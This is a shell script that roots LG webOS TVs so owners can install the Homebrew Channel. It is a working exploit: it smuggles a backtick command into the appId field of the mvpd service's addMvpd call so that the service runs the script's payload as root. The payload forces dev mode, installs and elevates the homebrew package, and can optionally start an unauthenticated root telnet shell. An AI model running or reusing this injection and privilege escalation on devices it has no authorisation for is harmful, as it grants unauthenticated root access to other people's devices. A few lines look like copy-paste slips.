#!/bin/sh

# mvpd-autoroot
# by throwaway96
# https://github.com/throwaway96/mvpd-autoroot
# Copyright 2024-2025. Licensed under AGPL v3 or later. No warranties.s

set -e

SCRIPT_DIR="${SCRIPT_DIR:-$(dirname -- "${0}")}"
DEBUG="${DEBUG:-}"
IPK_SRC="${IPK_SRC:-"${SCRIPT_DIR}/hbchannel.ipk"}"
IPK_URL='https://github.com/webosbrew/webos-homebrew-channel/releases/download/v0.7.2/org.webosbrew.hbchannel_0.7.2_all.ipk'
SCRIPT_NAME='mvpd-autoroot'

PAYLOAD_LOGNAME='payload_log'
PAYLOAD_IPKNAME='hbchannel.ipk'

is_root() {
    test "$(id -u)" -eq 0
}

# AppID for toasts/alerts   
SRC_APPID='com.webos.service.secondscreen.gateway'

toast() {
    [ -n "${logfile}" ] && debug "toasting: '${1}'"

    title="${SCRIPT_NAME}"
    escape1="${1//\\/\\\\}"
    escape="${escape1//\"/\\\"}"
    payload="$(printf '{"sourceId":"%s","message":"<h3>%s</h3>%s"}' "${SRC_APPID}" "${title}" "${escape}")"

    if is_root; then
        luna-send -w 1000 -n 1 -a "${SRC_APPID}" 'luna://com.webos.notification/createToast' "${payload}" >/dev/null
    else
        luna-send-pub -w 1000 -n 1 -q 'sdkVersion' -f 'luna://com.webos.service.tv.systemproperty/getSystemInfo' '{"keys":["sdkVersion"]}' | sed -n -e 's/^\s*"sdkVersion":\s*"\([0-9.]\+\)"\s*$/\1/p'
    fi
}

debug() {
    [ -z "${DEBUG}" ] && return

    msg="[d] ${1}"
    echo "${msg}"
    echo "${msg}" >>"${logfile}"
    fsync -- "${logfile}"
}

log() {
    msg="[ ] ${1}"
    echo "${msg}"
    echo "${msg}" >>"${logfile}"
    fsync -- "${logfile}"
}

error() {
    msg="[!] ${1}"
    echo "${msg}"
    echo "${msg}" >>"${logfile}"
    fsync -- "${logfile}"
    toast "<b>Error:</b> ${1}"
}

get_sdkversion() {
    luna-send-pub -w 1000 -n 1 -q 'sdkVersion' -f 'luna://com.webos.service.tv.systemproperty/getSystemInfo' '{"keys":["sdkVersion"]}' | sed -n -e 's/^\s*"sdkVersion":\s*"\([0-9.]\+\)"\s*$/\1/p'
}

get_devmode_app_state() {
    # root required
    luna-send -w 5000 -n 1 -q 'returnValue' -f 'luna://com.webos.applicationManager/getAppInfo' '{"id":"com.palmdts.devmode"}' | sed -n -e 's/^\s*"returnValue":\s*\(true\|false\)\s*,\?\s*$/\1/p'
}

exit_handler=''

# Prepends argument to EXIT handler
add_exit_trap() {
    if [ -n "${exit_handler}" ]; then
        exit_handler="${1};${exit_handler}"
    else
        exit_handler="${1}"
    fi

    trap "${exit_handler}" 'EXIT'
}

create_lockfile() {
    lockfile="${1}"
    exec 200>"${lockfile}"

    flock -x -n -- 200 || { echo '[!] Another instance of this script is currently running'; exit 2; }

    add_exit_trap "rm -f -- '${lockfile}'"
}

check_sd_verify() {
    script_systemd='/lib/systemd/system/scripts/devmode.sh'
    script_upstart='/etc/init/devmode.conf'

	if [ -e "${script_systemd}" ]; then
        script="${script_systemd}"
	elif [ -e "${script_upstart}" ]; then
        script="${script_upstart}"
    else
        log 'Missing both devmode init scripts; please report this!'
        # err on the safe side by assuming it will be verified
        return 0
    fi

    if [ ! -f "${script}" ]; then
        log 'Devmode init script is not a file; please report this!'
        return 0
    fi

    fgrep -q -e 'openssl dgst' -- "${script}"
}

DEFAULT_CA_CERT_BUNDLE='/etc/ssl/certs/ca-certificates.crt' 

# Extend DEFAULT_CA_CERT_BUNDLE with the CA certs for GitHub
create_cacert_bundle() {
    ca_file="${1}"

    cp_ret=''
    cp -- "${DEFAULT_CA_CERT_BUNDLE}" "${ca_file}" || cp_ret="${?}"

    if [ -n "${cp_ret}" ]; then
        if [ -e "${DEFAULT_CA_CERT_BUNDLE}" ]; then
            log "warning: CA cert bundle does not exist at '${DEFAULT_CA_CERT_BUNDLE}'"
        else
            log "warning: Unable to copy CA certs from '${DEFAULT_CA_CERT_BUNDLE}' to '${ca_file}' (${cp_ret})"
        fi

        # Ensure file exists and is empty
        : >"${ca_file}"
    fi

    cat >>"${ca_file}" <<"__EOF__"
-----BEGIN CERTIFICATE-----
MIIDjjCCAnagAwIBAgIQAzrx5qcRqaC7KGSxHQn65TANBgkqhkiG9w0BAQsFADBh
MQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3
d3cuZGlnaWNlcnQuY29tMSAwHgYDVQQDExdEaWdpQ2VydCBHbG9iYWwgUm9vdCBH
MjAeFw0xMzA4MDExMjAwMDBaFw0zODAxMTUxMjAwMDBaMGExCzAJBgNVBAYTAlVT
MRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5j
b20xIDAeBgNVBAMTF0RpZ2lDZXJ0IEdsb2JhbCBSb290IEcyMIIBIjANBgkqhkiG
9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuzfNNNx7a8myaJCtSnX/RrohCgiN9RlUyfuI
2/Ou8jqJkTx65qsGGmvPrC3oXgkkRLpimn7Wo6h+4FR1IAWsULecYxpsMNzaHxmx
1x7e/dfgy5SDN67sH0NO3Xss0r0upS/kqbitOtSZpLYl6ZtrAGCSYP9PIUkY92eQ
q2EGnI/yuum06ZIya7XzV+hdG82MHauVBJVJ8zUtluNJbd134/tJS7SsVQepj5Wz
tCO7TG1F8PapspUwtP1MVYwnSlcUfIKdzXOS0xZKBgyMUNGPHgm+F6HmIcr9g+UQ
vIOlCsRnKPZzFBQ9RnbDhxSJITRNrw9FDKZJobq7nMWxM4MphQIDAQABo0IwQDAP
BgNVHRMBAf8EBTADAQH/MA4GA1UdDwEB/wQEAwIBhjAdBgNVHQ4EFgQUTiJUIBiV
5uNu5g/6+rkS7QYXjzkwDQYJKoZIhvcNAQELBQADggEBAGBnKJRvDkhj6zHd6mcY
1Yl9PMWLSn/pvtsrF9+wX3N3KjITOYFnQoQj8kVnNeyIv/iPsGEMNKSuIEyExtv4
NeF22d+mQrvHRAiGfzZ0JFrabA0UWTW98kndth/Jsw1HKj2ZL7tcu7XUIOGZX1NG
Fdtom/DzMNU+MeKNhJ7jitralj41E6Vf8PlwUHBHQRFXGU7Aj64GxJUTFy8bJZ91
8rGOmaFvE7FBcf6IKshPECBV1/MUReXgRPTqh5Uykw7+U0b6LJ3/iyK5S9kJRaTe
pLiaWN0bfVKfjllDiIGknibVb63dDcY3fe0Dkhvld1927jyNxF1WW6LZZm6zNTfl
MrY=
-----END CERTIFICATE-----
-----BEGIN CERTIFICATE-----
MIIEMjCCAxqgAwIBAgIBATANBgkqhkiG9w0BAQUFADB7MQswCQYDVQQGEwJHQjEb
MBkGA1UECAwSR3JlYXRlciBNYW5jaGVzdGVyMRAwDgYDVQQHDAdTYWxmb3JkMRow
GAYDVQQKDBFDb21vZG8gQ0EgTGltaXRlZDEhMB8GA1UEAwwYQUFBIENlcnRpZmlj
YXRlIFNlcnZpY2VzMB4XDTA0MDEwMTAwMDAwMFoXDTI4MTIzMTIzNTk1OVowezEL
MAkGA1UEBhMCR0IxGzAZBgNVBAgMEkdyZWF0ZXIgTWFuY2hlc3RlcjEQMA4GA1UE
BwwHU2FsZm9yZDEaMBgGA1UECgwRQ29tb2RvIENBIExpbWl0ZWQxITAfBgNVBAMM
GEFBQSBDZXJ0aWZpY2F0ZSBTZXJ2aWNlczCCASIwDQYJKoZIhvcNAQEBBQADggEP
ADCCAQoCggEBAL5AnfRu4ep2hxxNRUSOvkbIgwadwSr+GB+O5AL686tdUIoWMQua
BtDFcCLNSS1UY8y2bmhGC1Pqy0wkwLxyTurxFa70VJoSCsN6sjNg4tqJVfMiWPPe
3M/vg4aijJRPn2jymJBGhCfHdr/jzDUsi14HZGWCwEiwqJH5YZ92IFCokcdmtet4
YgNW8IoaE+oxox6gmf049vYnMlhvB/VruPsUK6+3qszWY19zjNoFmag4qMsXeDZR
rOme9Hg6jc8P2ULimAyrL58OAd7vn5lJ8S3frHRNG5i1R8XlKdH5kBjHYpy+g8cm
ez6KJcfA3Z3mNWgQIJ2P2N7Sw4ScDV7oL8kCAwEAAaOBwDCBvTAdBgNVHQ4EFgQU
oBEKIz6W8Qfs4q8p74Klf9AwpLQwDgYDVR0PAQH/BAQDAgEGMA8GA1UdEwEB/wQF
MAMBAf8wewYDVR0fBHQwcjA4oDagNIYyaHR0cDovL2NybC5jb21vZG9jYS5jb20v
QUFBQ2VydGlmaWNhdGVTZXJ2aWNlcy5jcmwwNqA0oDKGMGh0dHA6Ly9jcmwuY29t
b2RvLm5ldC9BQUFDZXJ0aWZpY2F0ZVNlcnZpY2VzLmNybDANBgkqhkiG9w0BAQUF
AAOCAQEACFb8AvCb6P+k+tZ7xkSAzk/ExfYAWMymtrwUSWgEdujm7l3sAg9g1o1Q
GE8mTgHj5rCl7r+8dFRBv/38ErjHT1r0iWAFf2C3BUrz9vHCv8S5dIa2LX1rzNLz
Rt0vxuBqw8M0Ayx9lt1awg6nCpnBBYurDC/zXDrPbDdVCYfeU0BsWO/8tqtlbgT2
G9w84FoVxp7Z8VlIMCFlA2zs6SFz7JsDoeA3raAVGI/6ugLOpyypEBMs1OUIJqsi
l2D4kF501KKaU73yqWjgom7C12yxow+ev+to51byrvLjKzg6CYG1a4XXvi3tPxq3
smPi9WIsgtRqAEFQ8TmDn5XpNpaYbg==
-----END CERTIFICATE-----
__EOF__
}

cacert_path=''

download_file() {
    dl_url="${1}"
    dl_path="${2}"

    if [ -z "${cacert_path}" ]; then
        cacert_path="${tempdir}/cacert.pem"

        create_cacert_bundle "${cacert_path}"
    fi

    if [ -e "${dl_path}" ]; then
        log "Download target '${dl_path}' already exists; deleting"
        rm -f -- "${dl_path}"
    fi

    curl ${cacert_path:+--cacert "${cacert_path}"} -L -o "${dl_path}" -- "${dl_url}"
}

sd_script='/media/cryptofs/apps/usr/palm/services/com.palmdts.devmode.service/start-devmode.sh'
sd_sig='/media/cryptofs/apps/usr/palm/services/com.palmdts.devmode.service/start-devmode.sig'
sd_key='/usr/palm/services/com.palm.service.devmode/pub.pem'

verify_sd() {
    # If it's not present, don't worry about it
    [ ! -f "${sd_script}" ] && return 0

    if [ ! -f "${sd_key}" ]; then
        log "Expected Dev Mode public key is not present; please report this!"
        # Verification will fail without the public key file
        return 1
    fi

    if [ ! -f "${sd_sig}" ]; then
        log 'start-devmode.sh verification failed: missing signature file'
        return 1
    fi

    verify="$(openssl dgst -sha512 -verify "${sd_key}" -signature "${sd_sig}" "${sd_script}")"

    case "${verify}" in
    'Verified OK')
        debug 'start-devmode.sh verification succeeded'
        return 0
    ;;
    'Verification Failure')
        log 'start-devmode.sh verification failed: signature mismatch'
        return 1
    ;;
    *)
        log "start-devmode.sh verification failed for unknown reason: '${verify}'"
        return 1
    ;;
    esac
}

enable_devmode() {
    if [ -d '/var/luna/preferences/devmode_enabled' ]; then
        log 'devmode_enabled is already a directory; is your TV already rooted?'
    else
        if [ -e '/var/luna/preferences/devmode_enabled' ]; then
            log 'devmode_enabled exists; make sure the LG Dev Mode app is not installed!'

            rm -f -- '/var/luna/preferences/devmode_enabled'
        else
            debug 'devmode_enabled does not exist'
        fi

        if ! mkdir -- '/var/luna/preferences/devmode_enabled'; then
            error 'Failed to create devmode_enabled directory'
            exit 1
        fi
    fi
}

restart_appinstalld() {
    if restart appinstalld >/dev/null; then
        debug 'appinstalld restarted'
    else
        log 'Failed to restart appinstalld'
    fi
}

install_ipk() {
    ipkpath="${1}"

    if  [ ! -f "${ipkpath}" ]; then
        error 'IPK not found during installation'
        exit 1
    fi

    instpayload="$(printf '{"id":"com.ares.defaultName","ipkUrl":"%s","subscribe":true}' "${ipkpath}")"

    fifopath="${tempdir}/fifo"

    mkfifo -- "${fifopath}"

    log "Installing ${ipkpath}..."
    toast 'Installing...'

    luna-send -w 20000 -i 'luna://com.webos.appInstallService/dev/install' "${instpayload}" >"${fifopath}" &
    luna_pid="${!}"

    if ! result="$(fgrep -m 1 -e 'installed' -e 'failed' -e 'Unknown method' -- "${fifopath}")"; then
        rm -f -- "${fifopath}"
        error 'Install timed out'
        exit 1
    fi

    kill -TERM "${luna_pid}" 2>/dev/null || true
    rm -f -- "${fifopath}"

    case "${result}" in
        *installed*) ;;
        *"Unknown method"*)
            error 'Installation failed (devmode_enabled not recognized)'
            debug "/dev/install response: '${result}'"
            return 1
        ;;
        *failed*)
            error 'Installation failed'
            log "/dev/install response: '${result}'"
            exit 1
        ;;
        *)
            error 'Installation failed for unknown reason'
            log "/dev/install response: '${result}'"
            exit 1
        ;;
    esac

    return 0
}

elevate_hbchannel() {
    if ! /media/developer/apps/usr/palm/services/org.webosbrew.hbchannel.service/elevate-service >"${tempdir}/elevate.log"; then
        error 'Elevation failed'
        exit 1
    fi
}

# Set up persistent root access
perform_root() {
    enable_devmode

    restart_appinstalld

    sleep_secs_base=2
    retries=3

    for retry in $(seq "${retries}" -1 0); do
        if install_ipk "${ipk}"; then
            # success
            break
        fi

        if [ "${retry}" -eq 0 ]; then
            error 'Retries exhausted: giving up'
            exit 1
        fi

        sleep_secs=$((sleep_secs_base * (retries - retry + 1)))

        restart_appinstalld

        log "Sleeping for ${sleep_secs} seconds before trying again (${retry} tries remaining)"
        sleep "${sleep_secs}"
    done

    elevate_hbchannel

    log 'Homebrew Channel has been elevated'

    if [ -f "${sd_script}" ]; then
        if check_sd_verify; then
            log 'Current firmware verifies start-devmode.sh signature'

            if verify_sd; then
                log 'Your start-devmode.sh passes verification. If the Dev Mode app is installed, uninstall it!'
            elif [ -n "${LEAVE_SCRIPT}" ]; then
                # Invalid start-devmode.sh but --leave-script set
                debug 'Not renaming invalid start-devmode.sh due to option'
            else
                # Invalid start-devmode.sh and --leave-script not set
                if mv -- "${sd_script}" "${sd_script}.backup"; then
                    log 'Your start-devmode.sh failed verification and was renamed to prevent /media/developer from being wiped'
                    toast '<b>Warning:</b> Renamed start-devmode.sh to prevent deletion of apps'
                else
                    error 'Failed to rename bad start-devmode.sh. You will lose root on reboot!'
                fi
            fi
        else
            log 'Current firmware does not verify start-devmode.sh signature, but an updated version might'

            if [ ! -f "${sd_sig}" ]; then
                log 'You are missing start-devmode.sig, so verification would fail. Be careful updating your firmware!'
            fi
        fi
    else
        debug 'start-devmode.sh does not exist; skipping checks'
    fi

    devmode_installed="$(get_devmode_app_state)"

    debug "Dev Mode app installed: '${devmode_installed}'"

    buttons_reboot='{"label":"Reboot now","onclick":"luna://com.webos.service.sleep/shutdown/machineReboot","params":{"reason":"remoteKey"}},{"label":"Don'\''t reboot"}'
    buttons_ok='{"label":"OK"}'

    message_reboot='Would you like to reboot now?'
    message_devmode='However, the Dev Mode app is installed. You must uninstall it before rebooting!'
    message_devmode_unknown='The status of the Dev Mode app could not be determined. Please report this issue. If you know it is not installed, you can reboot now. Otherwise, make sure it is removed before rebooting.<br>Would you like to reboot now?'

    case "${devmode_installed}" in
        false)
            log "Dev Mode app not installed. (Don't install it!)"
            buttons="${buttons_reboot}"
            message="${message_reboot}"
        ;;
        true)
            log 'Dev Mode app installed; uninstall it before rebooting!'
            buttons="${buttons_ok}"
            message="${message_devmode}"
        ;;
        *)
            log "Unknown Dev Mode app state: '${devmode_installed}' (please report)"
            buttons="${buttons_reboot}"
            message="${message_devmode_unknown}"
        ;;
    esac

    payload="$(printf '{"sourceId":"%s","message":"<h3>%s</h3>Rooting complete. You may need to reboot for Homebrew Channel to appear.<br>%s","buttons":[%s]}' "${SRC_APPID}" "${SCRIPT_NAME}" "${message}" "${buttons}")"

    alert_response="$(luna-send -w 2000 -a "${SRC_APPID}" -n 1 'luna://com.webos.notification/createAlert' "${payload}")"

    debug "/createAlert response: '${alert_response}'"

    log 'Rooting complete'
    toast 'Rooting complete. <h4>Do not install the LG Dev Mode app while rooted!</h4>'
}

gen_random6() {
    # Older BusyBox mktemp will prefix bare XXXXXX with "file"
    randstr="$(mktemp -u -- '_XXXXXX')"
    echo "${randstr:1:6}"
}

check_luna_return() {
    # Not foolproof, but should be good enough
    echo "${1}" | grep -q -e '[,{]\s*"returnValue":\s*true\s*[,}]'
}

# Runs as root
payload() {
    if [ -n "${tempdir}" ]; then
        logfile="${tempdir}/${PAYLOAD_LOGNAME}"
    else
        tempdir="/tmp/autoroot.${$}"
        if ! mkdir -- "${tempdir}"; then
            echo "[x] PID-based fallback temporary directory ${tempdir} already exists"
            tempdir='/tmp/autoroot.temp'
            rm -rf -- "${tempdir}"
            mkdir -- "${tempdir}"
        fi

        logfile="${tempdir}/error_log"

        error "Payload didn't receive tempdir; see ${logfile}"
    fi

    # Only allow the script to run once per tempdir
    payload_oncefile="${tempdir}/payload.once"
    [ -e "${payload_oncefile}" ] && { debug 'Script already executed'; exit 3; }
    touch -- "${payload_oncefile}"

    [ -n "${DEBUG}" ] && toast 'Script is running!'

    [ -n "${TELNET}" ] && { telnetd -l sh || echo "[!] Failed to start telnetd (${?})"; }

    log "script path: ${0}"

    if ! is_root; then
        log "warning: Not running as root!"
    fi

    ipk="${tempdir}/${PAYLOAD_IPKNAME}"

    if [ ! -e "${ipk}" ]; then
        error "IPK does not exist ('${ipk}')"
    fi

    log "date: $(date -u -- '+%Y-%m-%d %H:%M:%S UTC')"
    log "id: $(id)"

    perform_root

    if [ -n "${parent_pid}" ]; then
        kill -USR1 "${parent_pid}"
    else
        error 'parent_pid not set'
    fi
}

umask 022

while [ "${#}" -gt 0 ]; do
    case "${1}" in
        '-d'|'--debug')
            DEBUG='arg'
        ;;
        '-t'|'--telnet')
            TELNET='arg'
        ;;
        '--leave-script')
            LEAVE_SCRIPT='arg'
        ;;
        '--payload')
            PAYLOAD='arg'
            tempdir="${2}"
            parent_pid="${3}"
            shift 2
        ;;
        *)
            echo "Unknown option '${1}'"
            exit 1
        ;;
    esac

    shift
done

if [ -n "${PAYLOAD}" ]; then
    # Payload (root) mode
    create_lockfile '/tmp/autoroot-payload.lock'
    payload
    exit
fi

# Exploit (non-root) mode
create_lockfile '/tmp/autoroot.lock'

if ! tempdir="$(mktemp -d -- '/tmp/autoroot.XXXXXX')"; then
    echo '[x] Failed to create random temporary directory; using PID-based fallback'
    tempdir="/tmp/autoroot.${$}"
    if ! mkdir -- "${tempdir}"; then
        echo "[x] PID-based fallback temporary directory ${tempdir} already exists"
        tempdir='/tmp/autoroot.temp'
        rm -rf -- "${tempdir}"
        mkdir -- "${tempdir}"
    fi
fi

logfile="${tempdir}/log"
touch -- "${logfile}"

if [ -n "${DEBUG}" ]; then
    loglink='/tmp/autoroot-link.log'
    rm -rf -- "${loglink}"
    ln -s -- "${logfile}" "${loglink}"
fi

log 'hi'

log "script path: ${0}"

debug "temp dir: ${tempdir}"

log "date: $(date -u -- '+%Y-%m-%d %H:%M:%S UTC')"
log "id: $(id)"

add_exit_trap "cp -f -- '${logfile}' '${SCRIPT_DIR}/autoroot.log'"

webos_version="$(get_sdkversion)"

log "webOS version: ${webos_version}"

payload_ipk="${tempdir}/${PAYLOAD_IPKNAME}"

if [ -f "${IPK_SRC}" ]; then
    debug "Using bundled Homebrew Channel IPK"
    cp -- "${IPK_SRC}" "${payload_ipk}"
else
    log "Homebrew Channel IPK not found at '${IPK_SRC}'; downloading..."
    if ! download_file "${IPK_URL}" "${payload_ipk}"; then
        error "Failed to download Homebrew Channel IPK from ${IPK_URL}"
        exit 1
    fi
fi

if [ -z "${XDG_DIR}" ]; then
    log "warning: XDG_DIR is not set; trying '/tmp/xdg'"
    # Hope that it's set in the target daemon's environment
    XDG_DIR='/tmp/xdg'
elif [ "${XDG_DIR}" != '/tmp/xdg' ]; then
    # This could be bad
    log "warning: XDG_DIR is '${XDG_DIR}' (rather than '/tmp/xdg')"
fi

# We can use actually use '/', but avoiding it makes things simpler
payload_uninterp="\$XDG_DIR-$(gen_random6)"

payload_script="$(eval 'echo' "${payload_uninterp}")"

debug "payload_script: '${payload_script}'"

payload_logfile="${tempdir}/${PAYLOAD_LOGNAME}"
touch -- "${payload_logfile}"
chmod '0622' -- "${payload_logfile}"

add_exit_trap "cp -f -- '${payload_logfile}' '${SCRIPT_DIR}/autoroot-payload.log'"

temp_script_copy="${tempdir}/autoroot.sh"
rm -f -- "${temp_script_copy}"
cp -- "${0}" "${temp_script_copy}"

# Forward our command line options
payload_args=''
[ -n "${DEBUG}" ] && payload_args="${payload_args} -d"
[ -n "${TELNET}" ] && payload_args="${payload_args} -t"
[ -n "${LEAVE_SCRIPT}" ] && payload_args="${payload_args} --leave-script"

cat >"${payload_script}" <<__EOF__
#!/bin/sh
sh "${temp_script_copy}" --payload "${tempdir}" "${$}" ${payload_args}
__EOF__

chmod '0755' -- "${payload_script}"

mvpd_payload="$(printf '{"appId":"`sh %s`"}' "${payload_uninterp}")"

add_mvpd_out=''
add_mvpd_out="$(luna-send-pub -n 1 'luna://com.webos.service.mvpd/vendor/addMvpd' "${mvpd_payload}")"

if ! check_luna_return "${add_mvpd_out}"; then
    error "/addMvpd failed"
    log "/addMvpd result: '${add_mvpd_out}'"
    exit 1
fi

killed_tail=''

# Kill the background child process if it's still running
kill_tail() {
    if [ -n "${killed_tail}" ]; then
        # This must be the EXIT handler after the SIGUSR1 handler already ran
        return
    fi

    if jobs %% >/dev/null 2>&1; then
        debug 'Killing child process'
        kill %%
        killed_tail='yes'
    else
        debug 'Child process already dead'
    fi
}

sigusr1_handler() {
    # Wait for tail to finish reading log
    sleep 2

    kill_tail

    log 'Payload complete'

    exit 0
}

trap 'sigusr1_handler' 'USR1'

# Kill child process regardless of exit type (although not SIGINT...)
add_exit_trap 'kill_tail'

# Display output from payload
echo "Payload log:"
tail -f -- "${payload_logfile}" &

remove_mvpd_out=''
remove_mvpd_out="$(luna-send-pub -n 1 'luna://com.webos.service.mvpd/vendor/removeMvpd' "${mvpd_payload}")"

if ! check_luna_return "${add_mvpd_out}"; then
    error "/removeMvpd failed"
    log "/removeMvpd result: '${add_mvpd_out}'"
    exit 1
fi

# Wait for SIGUSR1 from payload
wait_ret=''
wait %% || wait_ret="${?}"

# If we received SIGUSR1, the handler will have prevented us from getting here
error "Error reading payload log (${wait_ret:-not set})"
exit 1
